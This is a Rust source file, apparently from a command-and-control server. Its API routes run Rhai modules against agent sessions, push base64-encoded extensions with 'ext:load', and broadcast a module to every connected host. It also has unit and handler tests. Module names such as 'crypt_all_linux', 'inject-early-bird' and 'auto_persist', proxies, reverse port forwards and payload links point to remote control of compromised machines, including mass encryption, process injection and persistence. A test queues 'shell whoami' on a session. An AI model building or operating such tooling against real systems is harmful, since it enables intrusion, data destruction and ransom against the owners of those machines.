// src/api/routes/modules.rs
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json, Extension,
};
use std::sync::{Arc, Mutex};
use std::fs;
use std::path::{Path as FsPath, PathBuf};
use rhai::{Engine, Scope, Dynamic};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::api::state::ApiContext;
use crate::common::try_send_session_command;
use crate::api::models::{BroadcastModuleRequest, ExtensionPayload, ModuleExecRequest};
use crate::api::middleware::OperatorInfo;
use crate::common::SharedSessions;
use crate::database;

// --- Helpers ---

const MAX_SCRIPT_NAME_LEN: usize = 64;

fn ext_dir() -> &'static str { crate::config::config().server.extensions_dir.as_str() }
fn mod_dir() -> &'static str { crate::config::config().server.modules_dir.as_str() }

/// Script names are bare file stems, no path components allowed.
pub fn valid_script_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= MAX_SCRIPT_NAME_LEN
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Resolve `<dir>/<name>.rhai` and confirm the canonicalized result still
/// sits inside the canonicalized `dir` (blocks traversal and symlink escapes).
/// Returns None when the name is invalid or the file does not exist.
pub fn resolve_script_path(dir: &str, name: &str) -> Option<PathBuf> {
    if !valid_script_name(name) {
        return None;
    }
    let base = fs::canonicalize(dir).ok()?;
    let canon = fs::canonicalize(base.join(format!("{}.rhai", name))).ok()?;
    if canon.starts_with(&base) { Some(canon) } else { None }
}

/// Bounds for the server-side module engines. Modules are orchestrators
/// that queue commands and push extensions; they never need unbounded
/// loops or giant strings, and a runaway module must not wedge the server.
pub const MODULE_MAX_OPERATIONS: u64 = 500_000;
pub const MODULE_MAX_STRING_SIZE: usize = 1024 * 1024;
pub const MODULE_MAX_CALL_LEVELS: usize = 32;

/// Read an agent-side extension and build the `ext:load` command that
/// delivers it. Shared by the module engines here and by the auto-recon
/// module runner in server/session.rs so both paths resolve extension
/// names against the same directory with the same validation.
pub fn build_ext_load_command(ext_name: &str, args: &[String]) -> Result<String, String> {
    let filepath = resolve_script_path(ext_dir(), ext_name)
        .ok_or_else(|| format!("Error reading extension '{}': invalid name or not found", ext_name))?;
    let content = fs::read_to_string(&filepath)
        .map_err(|e| format!("Error reading extension '{}': {}", ext_name, e))?;
    let mut command = format!("ext:load {}", BASE64.encode(content));
    for arg in args {
        command.push(' ');
        command.push_str(arg);
    }
    Ok(command)
}

/// Fresh 64-char hex key for the crypt/decrypt module family. Generating a
/// key per run replaces the hardcoded key that every playbook run used to
/// share; the module prints the key so the operator can capture it.
pub fn random_hex_key() -> String {
    hex::encode(rand::random::<[u8; 32]>())
}

fn script_send_command(sessions: SharedSessions, session_id: u32, command: String) -> String {
    let sessions_lock = &sessions;
    if let Some(session) = sessions_lock.get(&session_id) {
        if try_send_session_command(session_id, &session.tx, command, None) {
            return "Queued".to_string();
        }
        return "Command queue full or closed".to_string();
    }
    "Session Not Found".to_string()
}

fn script_send_extension(sessions: SharedSessions, session_id: u32, ext_name: String, args: Vec<String>) -> String {
    let sessions_lock = &sessions;
    if let Some(session) = sessions_lock.get(&session_id) {
        // Extensions are agent-side scripts; they live in the extensions dir,
        // not the modules dir this file otherwise works with.
        match build_ext_load_command(&ext_name, &args) {
            Ok(command) => {
                if try_send_session_command(session_id, &session.tx, command, None) {
                    format!("Queued extension '{}'", ext_name)
                } else {
                    "Command queue full or closed".to_string()
                }
            }
            Err(e) => e,
        }
    } else {
        "Session Not Found".to_string()
    }
}

/// Build the Rhai engine that runs server-side modules. The auto-recon
/// module runner in server/session.rs registers the same function set so a
/// module behaves identically whether it is fired from the API or on
/// session connect. `print()` output is appended to `print_log` so the
/// caller can surface it instead of losing it to server stdout.
fn module_engine(sessions: &SharedSessions, print_log: Arc<Mutex<String>>) -> Engine {
    let mut engine = Engine::new();
    engine.set_max_operations(MODULE_MAX_OPERATIONS);
    engine.set_max_string_size(MODULE_MAX_STRING_SIZE);
    engine.set_max_call_levels(MODULE_MAX_CALL_LEVELS);

    let sessions_cmd = sessions.clone();
    engine.register_fn("send_c2_command", move |sess_id: i64, cmd: &str| {
        script_send_command(sessions_cmd.clone(), sess_id as u32, cmd.to_string())
    });

    let sessions_ext = sessions.clone();
    engine.register_fn("send_c2_extension", move |sess_id: i64, ext_name: &str, args: Vec<Dynamic>| {
        let string_args: Vec<String> = args.iter().map(|d| d.to_string()).collect();
        script_send_extension(sessions_ext.clone(), sess_id as u32, ext_name.to_string(), string_args)
    });

    engine.register_fn("random_hex_key", random_hex_key);

    engine.on_print(move |s| {
        if let Ok(mut log) = print_log.lock() {
            log.push_str(s);
            log.push('\n');
        }
    });

    engine
}

/// Compile and run a module for one session. Modules declare either
/// `run(session_id)` or `run(session_id, args)`. Returns the module's
/// return value plus everything it printed.
fn run_module_for_session(
    sessions: &SharedSessions,
    path: &FsPath,
    session_id: u32,
    args: Vec<String>,
) -> Result<(String, String), String> {
    let print_log = Arc::new(Mutex::new(String::new()));
    let engine = module_engine(sessions, print_log.clone());
    let ast = engine.compile_file(path.into())
        .map_err(|e| format!("Parse error: {}", e))?;
    let mut scope = Scope::new();

    // Modules declare either run(session_id) or run(session_id, args).
    // Try the shape that matches the call, then fall back to the other so a
    // module that requires arguments can still answer with its usage text.
    let result = if args.is_empty() {
        match engine.call_fn::<String>(&mut scope, &ast, "run", (session_id as i64,)) {
            Err(e) if e.to_string().contains("Function not found") => {
                engine.call_fn::<String>(&mut scope, &ast, "run", (session_id as i64, Vec::<Dynamic>::new()))
            }
            other => other,
        }
    } else {
        let arg_array: Vec<Dynamic> = args.into_iter().map(Dynamic::from).collect();
        match engine.call_fn::<String>(&mut scope, &ast, "run", (session_id as i64, arg_array)) {
            Err(e) if e.to_string().contains("Function not found") => {
                engine.call_fn::<String>(&mut scope, &ast, "run", (session_id as i64,))
            }
            other => other,
        }
    };

    let printed = print_log.lock().map(|l| l.clone()).unwrap_or_default();
    result
        .map(|r| (r, printed))
        .map_err(|e| format!("Runtime error: {}", e))
}

// --- Handlers ---

pub async fn list_modules(State(_): State<Arc<ApiContext>>) -> Json<Vec<String>> {
    let mut modules = Vec::new();
    if let Ok(entries) = fs::read_dir(mod_dir()) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_file() {
                    if let Some(name) = entry.file_name().to_str() {
                        if name.ends_with(".rhai") {
                            modules.push(name.trim_end_matches(".rhai").to_string());
                        }
                    }
                }
            }
        }
    }
    Json(modules)
}

pub async fn execute_module(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path((id, module_name)): Path<(u32, String)>,
    payload: Option<Json<ModuleExecRequest>>,
) -> Response {
    if !operator.can_execute() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Insufficient permissions"}))).into_response();
    }

    if !valid_script_name(&module_name) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid module name"}))).into_response();
    }

    let filename = match resolve_script_path(mod_dir(), &module_name) {
        Some(p) => p,
        None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Module not found on server"}))).into_response(),
    };

    let args = payload.map(|Json(p)| p.args).unwrap_or_default();
    let sessions = state.sessions.clone();
    let outcome = tokio::task::spawn_blocking(move || {
        run_module_for_session(&sessions, &filename, id, args)
    }).await;

    match outcome {
        Ok(Ok((result, output))) => (StatusCode::OK, Json(serde_json::json!({
            "module": module_name,
            "status": "executed",
            "result": result,
            "output": output,
        }))).into_response(),
        Ok(Err(e)) if e.starts_with("Parse error") => {
            (StatusCode::UNPROCESSABLE_ENTITY, Json(serde_json::json!({"error": e}))).into_response()
        }
        Ok(Err(e)) => {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e}))).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
            "error": format!("Module task failed: {}", e)
        }))).into_response(),
    }
}

pub async fn deploy_extension(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path((id, filename)): Path<(u32, String)>,
    payload: Option<Json<ExtensionPayload>>, 
) -> Response {
    if !operator.can_execute() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Insufficient permissions"}))).into_response();
    }

    if !valid_script_name(&filename) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid filename"}))).into_response();
    }

    // Extensions are agent-side scripts served from the extensions dir.
    let filepath = match resolve_script_path(ext_dir(), &filename) {
        Some(p) => p,
        None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Extension not found on server"}))).into_response(),
    };

    let script_content = match fs::read_to_string(&filepath) {
        Ok(c) => c,
        Err(_) => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Extension not found on server"}))).into_response(),
    };

    let b64_script = BASE64.encode(script_content);
    let mut command_str = format!("ext:load {}", b64_script);

    if let Some(Json(p)) = payload {
        // The ext:load wire format splits arguments on whitespace agent-side,
        // so a spaced argument cannot be represented. Reject it explicitly
        // instead of silently dropping it.
        if let Some(bad) = p.args.iter().find(|a| a.contains(' ')) {
            return (StatusCode::UNPROCESSABLE_ENTITY, Json(serde_json::json!({
                "error": format!("Argument '{}' contains a space, which the ext:load format cannot carry", bad)
            }))).into_response();
        }
        for arg in p.args {
            command_str.push(' ');
            command_str.push_str(&arg);
        }
    }

    let sessions = &state.sessions;
    if let Some(session) = sessions.get(&id) {
        if try_send_session_command(id, &session.tx, command_str, None) {
            return (StatusCode::OK, Json(serde_json::json!({
                "status": "queued",
                "message": format!("Extension '{}' sent to Client #{}", filename, id)
            }))).into_response();
        }
        return (StatusCode::SERVICE_UNAVAILABLE, Json(serde_json::json!({
            "error": "Session command queue is full or closed"
        }))).into_response();
    }

    (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
}

pub async fn broadcast_module(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(payload): Json<BroadcastModuleRequest>,
) -> Response {
    if !operator.can_execute() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Insufficient permissions"}))).into_response();
    }

    if !valid_script_name(&payload.module_name) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid module name"}))).into_response();
    }

    let filepath = match resolve_script_path(mod_dir(), &payload.module_name) {
        Some(p) => p,
        None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Module not found on server"}))).into_response(),
    };

    // Modules are server-side scripts: run the module once per active
    // session. Pushing the module source to agents (the old behavior) could
    // never work, because the agent engine has no run() entry point and no
    // send_c2_command binding.
    let active_ids: Vec<u32> = state.sessions.iter().map(|e| *e.key()).collect();

    let sessions = state.sessions.clone();
    let args = payload.args.clone();
    let outcome = tokio::task::spawn_blocking(move || {
        let mut per_session = Vec::with_capacity(active_ids.len());
        for id in active_ids {
            per_session.push((id, run_module_for_session(&sessions, &filepath, id, args.clone())));
        }
        per_session
    }).await;

    let per_session = match outcome {
        Ok(v) => v,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
            "error": format!("Module task failed: {}", e)
        }))).into_response(),
    };

    let cmd_log = format!("broadcast module:{}", payload.module_name);
    let db_inner = state.db.clone();
    let log_ids: Vec<u32> = per_session.iter().map(|(id, _)| *id).collect();
    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.get() {
            for id in log_ids {
                let req_id = rand::random::<u64>();
                database::log_command(&conn, id, req_id, &cmd_log);
            }
        }
    });

    let mut results = serde_json::Map::new();
    let mut reached = 0usize;
    for (id, res) in per_session {
        match res {
            Ok((result, output)) => {
                reached += 1;
                results.insert(id.to_string(), serde_json::json!({
                    "status": "executed", "result": result, "output": output,
                }));
            }
            Err(e) => {
                results.insert(id.to_string(), serde_json::json!({
                    "status": "error", "error": e,
                }));
            }
        }
    }

    (StatusCode::OK, Json(serde_json::json!({
        "status": "broadcast_executed",
        "module": payload.module_name,
        "targets_reached": reached,
        "results": results,
    }))).into_response()
}

// --- Unit tests ---

#[cfg(test)]
mod tests {
    use super::*;
    use dashmap::DashMap;

    /// Absolute path under the crate root, independent of the test CWD.
    fn test_dir(name: &str) -> std::path::PathBuf {
        std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(name)
    }

    /// Handlers under test resolve script dirs through the CWD-relative
    /// config defaults, so pin the CWD to the crate root before exercising
    /// them. Every caller sets the same target, which keeps this consistent
    /// when test threads run in parallel.
    fn ensure_cwd() {
        let _ = std::env::set_current_dir(env!("CARGO_MANIFEST_DIR"));
    }

    fn empty_sessions() -> SharedSessions {
        Arc::new(DashMap::new())
    }

    #[test]
    fn valid_script_name_accepts_bare_stems() {
        for name in ["recon", "crypt_all_linux", "inject-early-bird", "a"] {
            assert!(valid_script_name(name), "expected valid: {}", name);
        }
    }

    #[test]
    fn valid_script_name_rejects_traversal_and_paths() {
        for name in ["", "../etc", "a/b", "a\\b", "a.b", "a b", "a\0b"] {
            assert!(!valid_script_name(name), "expected invalid: {:?}", name);
        }
        let too_long = "x".repeat(MAX_SCRIPT_NAME_LEN + 1);
        assert!(!valid_script_name(&too_long));
    }

    #[test]
    fn resolve_script_path_blocks_traversal_and_missing_files() {
        let dir = std::env::temp_dir().join(format!("rcm_modtest_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let dir = dir.to_string_lossy().to_string();

        std::fs::write(format!("{}/real.rhai", dir), "fn run(id) { \"ok\" }").unwrap();
        assert!(resolve_script_path(&dir, "real").is_some());
        assert!(resolve_script_path(&dir, "missing").is_none());
        assert!(resolve_script_path(&dir, "../real").is_none());
        assert!(resolve_script_path(&dir, "sub/real").is_none());
        assert!(resolve_script_path(&dir, "").is_none());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_script_path_stays_inside_base_dir() {
        let dir = std::env::temp_dir().join(format!("rcm_modtest_canon_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let dir = dir.to_string_lossy().to_string();
        std::fs::write(format!("{}/inner.rhai", dir), "fn run(id) { \"ok\" }").unwrap();

        let resolved = resolve_script_path(&dir, "inner").unwrap();
        let base = std::fs::canonicalize(&dir).unwrap();
        assert!(resolved.starts_with(base));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn random_hex_key_is_64_hex_chars_and_unique() {
        let k1 = random_hex_key();
        let k2 = random_hex_key();
        assert_eq!(k1.len(), 64);
        assert!(k1.chars().all(|c| c.is_ascii_hexdigit()));
        assert_ne!(k1, k2, "two generated keys must not collide");
    }

    #[test]
    fn module_without_session_reports_not_found() {
        // With no live session the module still runs; send_c2_command just
        // reports that the session is gone.
        let dir = std::env::temp_dir().join(format!("rcm_modrun_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("probe.rhai");
        std::fs::write(&path, r#"
fn run(session_id) {
    let r = send_c2_command(session_id, "shell whoami");
    print("probe ran");
    return "got: " + r;
}
"#).unwrap();

        let sessions = empty_sessions();
        let (result, output) = run_module_for_session(&sessions, &path, 4242, vec![]).unwrap();
        assert_eq!(result, "got: Session Not Found");
        assert!(output.contains("probe ran"), "print output was captured: {:?}", output);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn module_with_args_receives_them() {
        let dir = std::env::temp_dir().join(format!("rcm_modargs_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("withargs.rhai");
        std::fs::write(&path, r#"
fn run(session_id, args) {
    return "argc=" + args.len + " first=" + args[0];
}
"#).unwrap();

        let sessions = empty_sessions();
        let (result, _) = run_module_for_session(
            &sessions, &path, 1, vec!["deadbeef".to_string()],
        ).unwrap();
        assert_eq!(result, "argc=1 first=deadbeef");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn module_requiring_args_still_answers_without_them() {
        // A module that only declares run(session_id, args) must not 500
        // when invoked bare; it gets an empty args array so it can return
        // its usage text.
        let dir = std::env::temp_dir().join(format!("rcm_modreq_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("needargs.rhai");
        std::fs::write(&path, r#"
fn run(session_id, args) {
    if args.len < 1 { return "Usage: needargs <key>"; }
    return "key=" + args[0];
}
"#).unwrap();

        let sessions = empty_sessions();
        let (result, _) = run_module_for_session(&sessions, &path, 1, vec![]).unwrap();
        assert_eq!(result, "Usage: needargs <key>");

        let (result, _) = run_module_for_session(&sessions, &path, 1, vec!["abc".to_string()]).unwrap();
        assert_eq!(result, "key=abc");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn module_args_fall_back_for_single_param_run() {
        let dir = std::env::temp_dir().join(format!("rcm_modfb_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("noargs.rhai");
        std::fs::write(&path, r#"fn run(session_id) { return "plain"; }"#).unwrap();

        let sessions = empty_sessions();
        let (result, _) = run_module_for_session(
            &sessions, &path, 1, vec!["ignored".to_string()],
        ).unwrap();
        assert_eq!(result, "plain");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn runaway_module_is_stopped_by_operation_limit() {
        let dir = std::env::temp_dir().join(format!("rcm_modloop_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("spin.rhai");
        std::fs::write(&path, r#"fn run(session_id) { loop { } return "never"; }"#).unwrap();

        let sessions = empty_sessions();
        let err = run_module_for_session(&sessions, &path, 1, vec![]).unwrap_err();
        assert!(err.contains("Runtime error"), "expected runtime error, got: {}", err);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn parse_error_is_reported_as_such() {
        let dir = std::env::temp_dir().join(format!("rcm_modparse_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("broken.rhai");
        std::fs::write(&path, "fn run( {{{ not rhai").unwrap();

        let sessions = empty_sessions();
        let err = run_module_for_session(&sessions, &path, 1, vec![]).unwrap_err();
        assert!(err.starts_with("Parse error"), "got: {}", err);

        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- Handler-level tests (execute_module / broadcast_module) ---

    use axum::{Router, routing::post, http::Request, body::Body};
    use axum::Extension as AxumExtension;
    use tower::ServiceExt;
    use std::collections::HashMap;

    fn admin_op() -> OperatorInfo {
        OperatorInfo { id: 1, username: "admin".into(), role: "admin".into() }
    }

    fn viewer_op() -> OperatorInfo {
        OperatorInfo { id: 2, username: "viewer".into(), role: "viewer".into() }
    }

    fn test_context() -> Arc<ApiContext> {
        let manager = r2d2_sqlite::SqliteConnectionManager::memory();
        let db = r2d2::Pool::new(manager).unwrap();
        let sessions: SharedSessions = Arc::new(DashMap::new());
        let results = Arc::new(Mutex::new(HashMap::new()));
        let listener_mgr = Arc::new(tokio::sync::Mutex::new(
            crate::server::listeners::ListenerManager::new(
                db.clone(), sessions.clone(), results.clone(), vec![], vec![], vec![],
            ),
        ));
        Arc::new(ApiContext {
            sessions,
            db,
            results,
            proxies: Arc::new(Mutex::new(HashMap::new())),
            rportfwds: Arc::new(Mutex::new(HashMap::new())),
            listener_mgr,
            login_limiter: Arc::new(Mutex::new(HashMap::new())),
            build_jobs: Arc::new(Mutex::new(HashMap::new())),
            payload_links: Arc::new(Mutex::new(HashMap::new())),
            dl_limiter: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    fn module_router(op: OperatorInfo) -> Router {
        Router::new()
            .route("/api/hosts/:id/modules/:module_name", post(execute_module))
            .route("/api/broadcast/module", post(broadcast_module))
            .layer(AxumExtension(op))
            .with_state(test_context())
    }

    fn post_json(uri: &str, body: serde_json::Value) -> Request<Body> {
        Request::builder()
            .method("POST").uri(uri)
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    }

    fn post_empty(uri: &str) -> Request<Body> {
        Request::builder().method("POST").uri(uri).body(Body::empty()).unwrap()
    }

    async fn resp_json(resp: Response) -> serde_json::Value {
        let b = hyper::body::to_bytes(resp.into_body()).await.unwrap();
        serde_json::from_slice(&b).unwrap_or(serde_json::Value::Null)
    }

    /// Writes a module into the real modules dir (where the handlers under
    /// test resolve it) and removes it on drop.
    struct ModuleFile(std::path::PathBuf);
    impl ModuleFile {
        fn create(label: &str, content: &str) -> (String, Self) {
            ensure_cwd();
            let name = format!("fixture_{}_{}", label, std::process::id());
            let dir = test_dir("modules");
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join(format!("{}.rhai", name));
            std::fs::write(&path, content).unwrap();
            (name, ModuleFile(path))
        }
    }
    impl Drop for ModuleFile {
        fn drop(&mut self) { let _ = std::fs::remove_file(&self.0); }
    }

    #[test]
    fn shipped_scripts_parse() {
        // Every .rhai we ship must at least parse; a syntax error here
        // otherwise only surfaces when an operator tasks the script. Paths
        // are anchored at the crate root so the test does not depend on the
        // CWD the runner happens to use.
        let mut engine = Engine::new();
        // Mirror the effective parser limits of the production engines. Both
        // the agent (src/agent/scripting/mod.rs, Engine::new()) and the
        // server module engine (module_engine above) run as release builds,
        // where rhai's default expression depth is 64/32. Under a debug
        // test profile the defaults drop to 32/16 and deeply nested shipped
        // scripts (auto_persist.rhai) fail to compile here only.
        engine.set_max_expr_depths(64, 32);
        for dir in ["modules", "extensions", "examples"].map(test_dir) {
            let Ok(entries) = std::fs::read_dir(&dir) else {
                panic!("cannot read {}", dir.display());
            };
            // Snapshot the listing first: sibling tests create and delete
            // their own fixture files in these shared dirs while this scan
            // runs.
            let paths: Vec<PathBuf> = entries.flatten().map(|e| e.path()).collect();
            for p in paths {
                if p.extension().and_then(|e| e.to_str()) != Some("rhai") {
                    continue;
                }
                // Fixture scripts belong to the handler tests; they are not
                // part of the shipped set.
                let stem = p.file_stem().and_then(|s| s.to_str()).unwrap_or("");
                if stem.starts_with("fixture_") {
                    continue;
                }
                match engine.compile_file(p.clone()) {
                    Ok(_) => {}
                    Err(e) => {
                        // A fixture deleted between the snapshot and this
                        // compile is a skip, not a parse failure. Genuine
                        // parse errors still panic.
                        let vanished = matches!(
                            *e,
                            rhai::EvalAltResult::ErrorSystem(_, ref inner)
                                if inner.downcast_ref::<std::io::Error>()
                                    .map(|io| io.kind())
                                    == Some(std::io::ErrorKind::NotFound)
                        );
                        if !vanished {
                            panic!("{} does not parse: {}", p.display(), e);
                        }
                    }
                }
            }
        }
    }

    #[tokio::test]
    async fn execute_module_rejects_viewer() {
        ensure_cwd();
        let app = module_router(viewer_op());
        let resp = app.oneshot(post_empty("/api/hosts/1/modules/recon")).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn execute_module_rejects_bad_name() {
        ensure_cwd();
        let app = module_router(admin_op());
        let resp = app.oneshot(post_empty("/api/hosts/1/modules/a.b")).await.unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }

    #[tokio::test]
    async fn execute_module_missing_returns_404() {
        ensure_cwd();
        let app = module_router(admin_op());
        let uri = format!("/api/hosts/1/modules/no_such_{}", std::process::id());
        let resp = app.oneshot(post_empty(&uri)).await.unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn execute_module_runs_with_args_and_captures_output() {
        ensure_cwd();
        let (name, _guard) = ModuleFile::create("exec_args", r#"
fn run(session_id, args) {
    print("hello from module");
    return "argc=" + args.len;
}
"#);
        let app = module_router(admin_op());
        let uri = format!("/api/hosts/7/modules/{}", name);
        let resp = app.oneshot(post_json(&uri, serde_json::json!({"args": ["x", "y"]}))).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let json = resp_json(resp).await;
        assert_eq!(json["result"].as_str().unwrap(), "argc=2");
        assert!(json["output"].as_str().unwrap().contains("hello from module"));
    }

    #[tokio::test]
    async fn execute_module_without_body_still_runs() {
        ensure_cwd();
        let (name, _guard) = ModuleFile::create("exec_nobody", r#"
fn run(session_id) { return "plain"; }
"#);
        let app = module_router(admin_op());
        let uri = format!("/api/hosts/7/modules/{}", name);
        let resp = app.oneshot(post_empty(&uri)).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let json = resp_json(resp).await;
        assert_eq!(json["result"].as_str().unwrap(), "plain");
    }

    #[tokio::test]
    async fn execute_module_parse_error_is_422() {
        ensure_cwd();
        let (name, _guard) = ModuleFile::create("exec_broken", "fn run( {{{ nope");
        let app = module_router(admin_op());
        let uri = format!("/api/hosts/7/modules/{}", name);
        let resp = app.oneshot(post_empty(&uri)).await.unwrap();
        assert_eq!(resp.status(), StatusCode::UNPROCESSABLE_ENTITY);
    }

    #[tokio::test]
    async fn broadcast_with_no_sessions_reaches_zero() {
        ensure_cwd();
        let (name, _guard) = ModuleFile::create("bcast_empty", r#"
fn run(session_id) { return "ok"; }
"#);
        let app = module_router(admin_op());
        let resp = app.oneshot(post_json("/api/broadcast/module",
            serde_json::json!({"module_name": name}))).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let json = resp_json(resp).await;
        assert_eq!(json["status"].as_str().unwrap(), "broadcast_executed");
        assert_eq!(json["targets_reached"].as_u64().unwrap(), 0);
    }

    #[tokio::test]
    async fn broadcast_rejects_bad_name_and_missing_module() {
        ensure_cwd();
        let app = module_router(admin_op());
        let resp = app.oneshot(post_json("/api/broadcast/module",
            serde_json::json!({"module_name": "../etc"}))).await.unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);

        let app = module_router(admin_op());
        let resp = app.oneshot(post_json("/api/broadcast/module",
            serde_json::json!({"module_name": format!("no_such_{}", std::process::id())}))).await.unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    }
}
